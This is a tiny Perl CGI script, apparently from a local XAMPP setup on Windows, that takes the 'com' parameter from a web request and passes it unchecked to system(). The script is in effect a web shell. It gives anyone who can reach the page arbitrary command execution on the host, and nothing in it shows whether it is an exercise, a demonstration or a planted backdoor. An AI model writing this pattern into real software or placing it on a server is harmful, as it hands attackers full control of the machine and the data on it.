#!C:\Users\MAHEEN HUDA\OneDrive\Desktop\xampp\perl\bin\perl.exe
use CGI ':standard';

print  "\n\n Content-type:text/html\n\n";

$c=param('com');

system($c);